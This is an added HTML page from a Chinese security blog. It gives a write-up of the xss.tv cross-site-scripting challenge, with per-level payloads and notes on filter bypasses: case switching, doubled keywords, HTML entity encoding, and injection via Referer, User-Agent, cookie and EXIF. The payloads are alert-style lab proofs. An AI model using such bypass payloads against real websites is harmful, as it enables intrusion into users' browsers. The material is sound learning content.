@@ -1,0 +1,703 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="渗透测试,XSS," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> XSS挑战之旅 // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              XSS挑战之旅
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2017-06-08
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2017/06/08/xss-challenge/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2017/06/08/xss-challenge/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <p>XSS挑战赛 <a href="http://test.xss.tv" target="_blank" rel="external">http://test.xss.tv</a></p>
+<p> Mannix 安全文库<br> <a href="https://mp.weixin.qq.com/s?timestamp=1496844938&amp;src=3&amp;ver=1&amp;signature=9V9EcClg01D4BFYw1oHMMuYrbJ6so3nSGGhP4mfhG4dY9-Tl9jpg-vvNCPhrdkokqNlUl6D2fOQI1p0F0Db3qt80RoiVO6Ac40lCbI4fGNK8zkXp1obYtvexz4G2dXD07pGypwioZFHQKYpmrI5FCxSMxgevZTh*MQ47YXErWqI=" target="_blank" rel="external">https://mp.weixin.qq.com/s?timestamp=1496844938&amp;src=3&amp;ver=1&amp;signature=9V9EcClg01D4BFYw1oHMMuYrbJ6so3nSGGhP4mfhG4dY9-Tl9jpg-vvNCPhrdkokqNlUl6D2fOQI1p0F0Db3qt80RoiVO6Ac40lCbI4fGNK8zkXp1obYtvexz4G2dXD07pGypwioZFHQKYpmrI5FCxSMxgevZTh*MQ47YXErWqI=</a></p>
+<p><a href="https://xianzhi.aliyun.com/forum/read/1462.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/1462.html</a></p>
+<h1 id="综合讨论"><a href="#综合讨论" class="headerlink" title="综合讨论"></a>综合讨论</h1><p>总体来说反射型XSS用途已经不那么大了，如果payload在url中很容易被chrome xss auditor拦截。</p>
+<h1 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h1><h2 id="判断核心字符是否被过滤"><a href="#判断核心字符是否被过滤" class="headerlink" title="判断核心字符是否被过滤"></a>判断核心字符是否被过滤</h2><p>关键字符<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;, &gt; <span class="meta"># 构造标签</span></span><br><span class="line"><span class="string">", ' # 闭合属性</span></span><br><span class="line">&amp;, <span class="meta">#, ; # HTML16编码</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="辅助挖掘"><a href="#辅助挖掘" class="headerlink" title="辅助挖掘"></a>辅助挖掘</h2><p>判断过滤payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;&gt;</span>"'zxcv # 还可以加上宽字节</span><br><span class="line">script</span><br><span class="line">href</span><br><span class="line">oninput</span><br><span class="line">"'%&amp;#&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"onmouseover="</span> <span class="attr">onmouseover</span>=<span class="string">"xx"</span> <span class="attr">onxxx</span>=<span class="string">""</span>&gt;</span>location_beacon<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">' "&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(2)</span> <span class="attr">x</span>=</span></span><br></pre></td></tr></table></figure>
+<p>构造标签<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">confirm(<span class="string">"XssHere"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">test"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">prompt(<span class="string">"XssHere"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">test"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"XssHere"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>输入点位于属性内，基于事件<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">' oninput=alert`1` //</span><br><span class="line">' oninput=alert`1` '</span><br><span class="line">' onchange=alert`1` //</span><br><span class="line">' onchange=alert`1` '</span><br></pre></td></tr></table></figure></p>
+<p>输入点位于属性内， 截断属性，构造标签(script标签 或者 a标签)<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt; &lt;a href="</span>javascrip<span class="variable">t:</span>%<span class="number">61</span>lert(<span class="number">1</span>)<span class="comment">"&gt;click me&lt;/a&gt; //</span></span><br><span class="line"><span class="string">"&gt; &lt;a href="</span>javascrip<span class="variable">t:alert</span>(<span class="string">'xss'</span>)<span class="comment">"&gt;111&lt;/a&gt; //</span></span><br><span class="line"><span class="string">"&gt; &lt;a href="</span>javascrip<span class="variable">t:alert</span>(/<span class="number">1</span>/)<span class="comment">"&gt;axxx&lt;/a&gt; //</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>反射型xss挖掘<br>构造特殊输入，在结果HTML源码中搜索，<strong>寻找输出点</strong>。<br>根据输出点位置附近的代码情况来构造闭合。</p>
+<h3 id="过关payload"><a href="#过关payload" class="headerlink" title="过关payload"></a>过关payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"XssHere"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>与level 1思路一致。<br>只是level 1输入点在URL中。<br>不过其实本质上 level 2 的输入点也是在URL中。<br>不过level 2 体现了很重要的一点，搜索处容易出现反射型xss。</p>
+<h3 id="过关payload-1"><a href="#过关payload-1" class="headerlink" title="过关payload"></a>过关payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"XssHere"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>输入点(INPUT_POINT)有两处，一处在标签间<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span>没有找到和INPUT_POINT相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>另一处在标签属性处<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">input</span> name=<span class="string">"keyword"</span> value=<span class="string">"INPUT_POINT"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>对左右尖括号(&lt;,&gt;)被转化成HTML字符实体(HTML Entity)的情况<br>想直接构造标签是有难度的(宽字符构造尖括号?)所以从另一处入手。<br>输入点位于属性内，所以闭合属性并构造新属性，基于事件弹窗。<br>(然而如果输入点对&lt;,&gt;,’,”都进行了字符实体转换呢)<br>(构造标签的关键是&lt;,&gt;, 闭合属性的关键是引号)</p>
+<h3 id="过关payload-2"><a href="#过关payload-2" class="headerlink" title="过关payload"></a>过关payload</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' oninput=alert`1` //</span><br></pre></td></tr></table></figure>
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>和 level 3 输出点一致</p>
+<h3 id="过关payload-3"><a href="#过关payload-3" class="headerlink" title="过关payload"></a>过关payload</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" oninput=alert`1` //</span></span><br></pre></td></tr></table></figure>
+<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>此处的防御是<br>on 替换为 <code>o_n</code><br>script 替换为 <code>sc_ript</code><br>因此不能再考虑用事件出发，也不能用script标签触发。</p>
+<h3 id="过关payload-4"><a href="#过关payload-4" class="headerlink" title="过关payload"></a>过关payload</h3><p>此处的用<code>&quot;&gt;</code>截断属性，再用a标签触发<br>关键在于虽然在h5的内容过滤了，但在属性内未过滤<code>&quot;&gt;</code>。<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt; &lt;a href="</span>javascrip<span class="variable">t:</span>%<span class="number">61</span>lert(<span class="number">1</span>)<span class="comment">"&gt;click me&lt;/a&gt; //</span></span><br><span class="line"><span class="string">"&gt; &lt;a href="</span>javascrip<span class="variable">t:alert</span>(<span class="string">'xss'</span>)<span class="comment">"&gt;111&lt;/a&gt; //</span></span><br><span class="line"><span class="string">"&gt; &lt;a href="</span>javascrip<span class="variable">t:alert</span>(/<span class="number">1</span>/)<span class="comment">"&gt;axxx&lt;/a&gt; //</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>此处的防御大概如下<br>href 转换为 <code>hr_ef</code><br>on 替换为 <code>o_n</code><br>然而只要切换大小写就可以绕过转换。</p>
+<h3 id="过关payload-5"><a href="#过关payload-5" class="headerlink" title="过关payload"></a>过关payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"&gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">Href</span>=<span class="string">"javascript:alert(/1/)"</span>&gt;</span>axxx<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">"&gt; <span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="actionscript">alert(<span class="string">'handsome boy'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //</span><br><span class="line">"&gt; <span class="tag">&lt;<span class="name">img</span> <span class="attr">Src</span>=<span class="string">x</span> <span class="attr">OnError</span>=<span class="string">alert('xss')</span>&gt;</span> //</span><br></pre></td></tr></table></figure>
+<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>href, on, script等关键字被删除了。</p>
+<h3 id="过关payload-6"><a href="#过关payload-6" class="headerlink" title="过关payload"></a>过关payload</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" oonninput=alert(1) "</span></span><br><span class="line"><span class="string">"&gt; &lt;scscriptript&gt;alert`xss`&lt;/scscriptript&gt; //</span></span><br></pre></td></tr></table></figure>
+<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>属性中双引号被转换成HTML实体，无法截断属性。<br>由于script关键字被过滤，得考虑绕过方式，使用HTML实体字符绕过<br>HTML16编码<br>HTML10编码<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javascript</span>:alert(/<span class="number">1</span>/)</span><br><span class="line"><span class="attribute">javascript</span>:%<span class="number">61</span>lert(<span class="number">1</span>)</span><br><span class="line">javasc&amp;#x72;<span class="attribute">ipt</span>:alert<span class="built_in">`1`</span></span><br><span class="line">javasc&amp;#x0072;<span class="attribute">ipt</span>:alert<span class="built_in">`1`</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>提交参数中必须要有http关键字</p>
+<h3 id="过关payload-7"><a href="#过关payload-7" class="headerlink" title="过关payload"></a>过关payload</h3><p>记得替换script<br>比如用<code>&amp;#x72;</code>替换r<br><code>%0d</code>和<code>%0a</code>,<code>/</code>等有时具有替代空格的作用</p>
+<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javascript</span>:<span class="attribute">alert(1)//http</span>:<span class="comment">//www.0aa.me  //利用注释</span></span><br><span class="line"><span class="attribute">javascript</span>:%<span class="number">0</span><span class="attribute">dhttp</span>:<span class="comment">//www.0aa.me%0dalert(1)  //不能用注释的情况下</span></span><br></pre></td></tr></table></figure>
+<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>keyword参数注入点，左右尖括号均被过滤，几乎没可能。<br>我觉得这题是考察挖掘URL以外的注入点。<br>这个思路有点玄学，发掘隐藏的form标签，找到另一个参数t_sort</p>
+<h3 id="过关payload-8"><a href="#过关payload-8" class="headerlink" title="过关payload"></a>过关payload</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=<span class="string">" type="</span>text<span class="string">"onmouseover=alert`1` "</span></span><br></pre></td></tr></table></figure>
+<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>与 10 类似，寻找新的注入点。<br>原来的t_sort的双引号被过滤了。<br>这次注入点是在 HTTP Request Header 请求头的 Refer 字段。</p>
+<h3 id="过关payload-9"><a href="#过关payload-9" class="headerlink" title="过关payload"></a>过关payload</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" type="</span>text<span class="string">" onmouseover=alert`1` "</span></span><br></pre></td></tr></table></figure>
+<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>寻找新的注入点，这次在user-agent。</p>
+<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>寻找新的注入点，这次是利用cookie中的参数注入</p>
+<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>进一步加深<strong>一切外来输入都是潜在有害的</strong>印象。<br>EXIF注入，脑洞大开。虽然在实际上一般没什么卵用。</p>
+<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2>
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/"> #渗透测试 </a>
+          
+            <a href="/tags/XSS/"> #XSS </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/06/15/wall-of-sheep/">Wall of Sheep</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/06/07/web-vul-scanner/">Web漏洞扫描工具评估列表</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2017/06/08/xss-challenge/"
+               data-title="XSS挑战之旅" data-url="http://blkstone.github.io/2017/06/08/xss-challenge/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">359</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">117</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#综合讨论"><span class="nav-number">1.</span> <span class="nav-text">综合讨论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#常见payload"><span class="nav-number">2.</span> <span class="nav-text">常见payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#判断核心字符是否被过滤"><span class="nav-number">2.1.</span> <span class="nav-text">判断核心字符是否被过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#辅助挖掘"><span class="nav-number">2.2.</span> <span class="nav-text">辅助挖掘</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#writeup"><span class="nav-number">3.</span> <span class="nav-text">writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level-1"><span class="nav-number">3.1.</span> <span class="nav-text">level 1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#过关payload"><span class="nav-number">3.1.1.</span> <span class="nav-text">过关payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-2"><span class="nav-number">3.2.</span> <span class="nav-text">level 2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#过关payload-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">过关payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-3"><span class="nav-number">3.3.</span> <span class="nav-text">level 3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#过关payload-2"><span class="nav-number">3.3.1.</span> <span class="nav-text">过关payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-4"><span class="nav-number">3.4.</span> <span class="nav-text">level 4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#过关payload-3"><span class="nav-number">3.4.1.</span> <span class="nav-text">过关payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-5"><span class="nav-number">3.5.</span> <span class="nav-text">level 5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#过关payload-4"><span class="nav-number">3.5.1.</span> <span class="nav-text">过关payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-6"><span class="nav-number">3.6.</span> <span class="nav-text">level 6</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#过关payload-5"><span class="nav-number">3.6.1.</span> <span class="nav-text">过关payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-7"><span class="nav-number">3.7.</span> <span class="nav-text">level 7</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#过关payload-6"><span class="nav-number">3.7.1.</span> <span class="nav-text">过关payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-8"><span class="nav-number">3.8.</span> <span class="nav-text">level 8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-9"><span class="nav-number">3.9.</span> <span class="nav-text">level 9</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#过关payload-7"><span class="nav-number">3.9.1.</span> <span class="nav-text">过关payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-10"><span class="nav-number">3.10.</span> <span class="nav-text">level 10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#过关payload-8"><span class="nav-number">3.10.1.</span> <span class="nav-text">过关payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-11"><span class="nav-number">3.11.</span> <span class="nav-text">level 11</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#过关payload-9"><span class="nav-number">3.11.1.</span> <span class="nav-text">过关payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-12"><span class="nav-number">3.12.</span> <span class="nav-text">level 12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-13"><span class="nav-number">3.13.</span> <span class="nav-text">level 13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-14"><span class="nav-number">3.14.</span> <span class="nav-text">level 14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-15"><span class="nav-number">3.15.</span> <span class="nav-text">level 15</span></a></li></ol></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2017
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
